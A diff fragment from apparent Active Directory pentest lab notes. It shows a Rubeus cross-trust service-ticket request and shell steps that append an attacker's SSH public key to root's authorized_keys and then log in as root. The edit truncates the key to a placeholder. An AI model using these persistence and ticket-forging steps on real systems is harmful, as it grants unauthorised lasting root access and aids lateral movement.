@@ -381,7 +381,7 @@ Rubeus.exe asktgs /ticket:trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local
 cd /root
 mkdir .ssh 
 cd .ssh 
-echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCYAcnDL/a0CEBRiUHdhpLZQv6BLU1l5yB2wkgIBjJbZoWrXlALu3g8adnZkLl55A6/ph68JGQBqDWENBm6FBpaxIInbWPOPPFnUOYP3CQuksPO0785lGecR/4IoWvdTiiu6M5DfAzc7zzlIzNrnIV50zxa48f5b7dTyqjfHjP4h2jwbkA/NwA3KXSw9/9x5chiwVmfHqTQHVmYz8wDwVv4NhJQm/V7SHKKekMuhX+Ei4+pgwCRbr1h2RbFcnol3zZkb0NOBMTrJRhirXJqM6Fqj/I0T/EEv/O3rf4cW6k6Lq/+b9rrOFwrwpc7ElXSxJaKKlpbzV1mW1BtR7yvFVAd5tGdKmRsEAAEvPvlxhit1+EQuJChAt7TNQTEm8uqXjkJ8+TXjHFkVrOz1Z5BAuwBJEB8Tgd3zxaapkenc/APrHbfwzsJOZOqLVsrVEhgocaV7wu3QKwj8X8BtHR89D5PwKTyVHSHawyFdMq7UsM2UAgHfmyQN+Z/ZcDIOMppqc= kali@kali" >> /root/.ssh/authorized_keys
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQA... >> /root/.ssh/authorized_keys
 ssh root@192.168.154.164
 ```
 #### SSH keys 
